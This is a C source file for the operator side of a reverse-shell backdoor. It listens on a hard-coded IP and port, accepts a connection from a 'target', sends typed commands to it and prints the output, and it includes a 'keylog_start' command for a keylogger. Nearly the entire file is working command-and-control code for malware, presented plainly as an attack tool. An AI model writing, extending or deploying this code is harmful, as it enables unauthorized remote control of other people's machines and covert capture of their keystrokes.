#include <stdio.h>      //standard input/output
#include <stdlib.h>     //standard utilities library
#include <unistd.h>     //access to the POSIX operating system API
#include <sys/types.h>	//other function prototypes
#include <sys/socket.h> //main socket header
#include <netinet/in.h> //internet address family
#include <string.h>     //manupulate strings
#include <arpa/inet.h>	//port and socket operations

//set host IP Address and Port [EDIT HERE]
char *ServIP = "192.168.0.9";
unsigned short ServPort = 54654;

//create connection, send command, receive response
int main()
{
	int sock, client_socket; //own socket and client socket
	char buffer[1024]; //store command from server
	char response[18384]; //store response
	struct sockaddr_in server_address, client_address; //create socket object

	int i=0;
	int optval = 1;
	socklen_t client_length;

	//define socket object
	sock = socket(AF_INET, SOCK_STREAM, 0);

	//socket setup error
	if (setsockopt (sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0)
	{
		printf("Error Setting TCP Socket Options!\n");
		return 1;
	}

	//setup server address
	server_address.sin_family = AF_INET;
	server_address.sin_addr.s_addr = inet_addr(ServIP); //set host IP
	server_address.sin_port = htons(ServPort); //set port

	//bind socket
	bind(sock, (struct sockaddr *) &server_address, sizeof(server_address));
	listen(sock, 5);
	client_length = sizeof(client_address);
	client_socket = accept(sock, (struct sockaddr *) &client_address, &client_length); //accept connection

	while(1)
	{
		//bzero doesn't need predefinition in linux
		jump:
		bzero(&buffer, sizeof(buffer));
		bzero(&response, sizeof(response));

		printf("* shell@%s:~$ ", inet_ntoa(client_address.sin_addr)); //create shell feed
		fgets(buffer, sizeof(buffer), stdin); //get command and store in buffer
		strtok(buffer, "\n");
		write(client_socket, buffer, sizeof(buffer)); //send command to target

		//quit server with q command
		if (strncmp("q", buffer, 1) == 0)
		{
			break;
		}
		
		//change directory with cd command
		else if(strncmp("cd ", buffer, 3) == 0)
		{
			goto jump;
		}

		//implement keylogger
		else if(strncmp("keylog_start", buffer, 12) == 0)
		{
			goto jump;
		}
		
		//run any other command
		else
		{
			recv(client_socket, response, sizeof(response), MSG_WAITALL);
			printf("%s", response);
		}
	}
}
